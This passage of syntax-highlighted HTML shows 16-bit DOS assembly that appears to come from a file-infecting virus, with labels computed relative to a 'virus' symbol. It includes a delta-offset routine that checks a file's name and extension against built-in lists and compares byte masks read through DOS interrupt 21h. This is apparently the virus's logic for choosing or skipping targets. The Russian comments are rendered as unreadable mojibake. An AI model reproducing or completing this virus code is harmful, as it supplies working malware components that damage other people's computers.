</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">end_solve_crc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">extention</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;â® COM ä ©«</span><span class="sc0">
</span><span class="sc5">filemask</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Asciiz</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">initial_offset_Asciiz</span><span class="sc0">
</span><span class="sc5">initial_offset_Asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">initial_offset_Asciiz</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;„«ï ­ ç «  ®â¤¥«¨¬ ¨¬ï ä ©«  ®â ¯ãâ¨</span><span class="sc0">
        </span><span class="sc1">;‚å®¤:  DS:DX - "¤¨áª:¯ãâì\¨¬ï ä ©« ",0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">seach_name_from_path</span><span class="sc0">
        </span><span class="sc1">;‚ëå®¤: DS:DX - ­ ç «® ¨¬¥­¨ ä ©« </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">reform_name_to_big_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI] -&gt; AL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">al_to_big_letter</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">    </span><span class="sc1">;AL - &gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">filenames_check</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">reform_name_to_big_letter</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;p®¢¥pª  ¯® ¯¥p¥ç­î ¨¬¥­</span><span class="sc0">
</span><span class="sc5">filenames_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filenames</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc1">;®¯p®£p ¬¬  áp ¢­¥­¨ï ®¤­®© áâp®ª¨ á ­¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë</span><span class="sc0">
       </span><span class="sc1">;‚å®¤: DS:[SI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢­¨¢ âìáï ­ ¡®p áâp®ª</span><span class="sc0">
       </span><span class="sc1">;      ES:[DI] ¡ §  áâp®ª ¢ ä®p¬ â¥:</span><span class="sc0">
       </span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
       </span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
       </span><span class="sc1">;      db  0ffh  - p¨§­ ª ª®­æ </span><span class="sc0">
       </span><span class="sc1">;‚ëå®¤: AL==0  - ­¥â á®¢¯ ¤¥­¨©</span><span class="sc0">
       </span><span class="sc1">;       AL!=0 - ­®¬¥p á®¢¯ ¢è¥© áâp®ª¨ ­ ç¨­ ï á 1'æë</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">check_file_extention</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">number_filename_no_mask_checked</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">check_file_extention</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_filemask_zero_exit</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;p®¢¥pª  ¯® ¯¥p¥ç­î p áè¨p¥­¨©</span><span class="sc0">
</span><span class="sc5">check_file_extention</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">seach_point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">point_found</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">seach_point</span><span class="sc0">
</span><span class="sc5">point_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extentions</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;p®¢¥pª  ¯® ¯¥p¥ç­î ¬ á®ª</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0"> </span><span class="sc1">;âªpëâì ®¯¨á â¥«ì ¤«ï çâ¥­¨ï</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemasks</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;(1) ¨ ¥áâì á¬¥é¥­¨¥ ¬ áª¨</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;‘¬¥é¥­¨¥ ¡¥p¥âáï ¨§ ä ©«  ¯® (1)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">GATE1_mask_failed</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;‘¬¥é¥­¨¥ ¡¥p¥âáï ¨§ ä ©«  ¯® (1)*10h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">GATE1_mask_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">read_and_check_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;—¨â ¥¬ ¬ áªã ¨ ¯p®¢¥pï¥¬ ¬ áªã</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">next_letter_of_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">next_letter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'?'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">letter_is_not_q</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">39h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
</span><span class="sc5">next_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">mask_coincide</span><span class="sc0">
</span><span class="sc5">letter_is_not_q</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">            </span><span class="sc1">;DS:[SI] á ES:[DI]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
</span><span class="sc5">mask_coincide</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;‘®¢¯ «  ¬ áª </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_Asciiz</span><span class="sc0">
</span><span class="sc5">mask_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Œ áª  ­¥ á®¢¯ « </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_mask</span><span class="sc0">
</span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exit_Asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">asciiz</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;®¨áª ¨¬¥­¨ ä ©«  ¨§ ¯ãâ¨</span><span class="sc0">
</span><span class="sc1">;‚å®¤:  DS:DX - "¤¨áª:\¯ãâì\¨¬ï ä ©« ",0</span><span class="sc0">
</span><span class="sc1">;‚ëå®¤: DS:DX - ­ ç «® ¨¬¥­¨ ä ©« </span><span class="sc0">
</span><span class="sc5">seach_name_from_path</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">set_bx_to_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">scan_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI] ("¤¨áª:\¯ãâì\¨¬ï ä ©« ",0)-&gt; AL</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
